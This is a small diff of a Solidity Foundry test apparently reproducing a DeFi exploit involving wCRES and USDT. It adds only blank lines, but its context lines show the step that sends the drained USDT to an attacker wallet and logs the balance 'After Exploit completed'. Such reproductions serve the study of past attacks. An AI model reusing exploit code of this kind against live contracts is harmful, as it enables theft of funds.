@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 import "./../interface.sol";
 
 contract ContractTest is Test {
+
     uint256 wCRES_amount = 130_000_000_000_000_000_000_000;
 
     uint256 usdt_amount = 1_100_000_000_000;
@@ -46,4 +47,5 @@ contract ContractTest is Test {
         usdt_token.transfer(mywallet, usdt_token.balanceOf(address(this)));
         emit log_named_uint("After Exploit completed, USDT Balance", usdt_token.balanceOf(mywallet));
     }
+
 }
